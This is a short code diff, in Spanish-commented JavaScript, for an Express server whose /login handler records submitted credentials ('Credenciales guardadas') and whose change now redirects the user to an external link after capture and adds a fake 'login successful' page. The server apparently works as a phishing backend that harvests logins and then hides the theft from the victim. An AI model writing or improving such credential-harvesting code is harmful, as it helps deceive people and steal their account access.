@@ -4,7 +4,7 @@ const fs = require('fs');
 const path = require('path');
 
 const app = express();
-const port = 3000;
+const port = process.env.PORT || 3000;
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
@@ -19,8 +19,13 @@ app.post('/login', (req, res) => {
       return;
     }
     console.log('Credenciales guardadas:', logEntry);
-    res.send('Intento de login registrado');
+    // Redirigir a una página de éxito
+    res.redirect('https://gifft.me/es/o/l/u1dwyxojs1f6ghl61b02xua0');
   });
+});
+
+app.get('/success', (req, res) => {
+  res.send('Inicio de sesión exitoso. ¡Bienvenido!');
 });
 
 app.listen(port, () => {
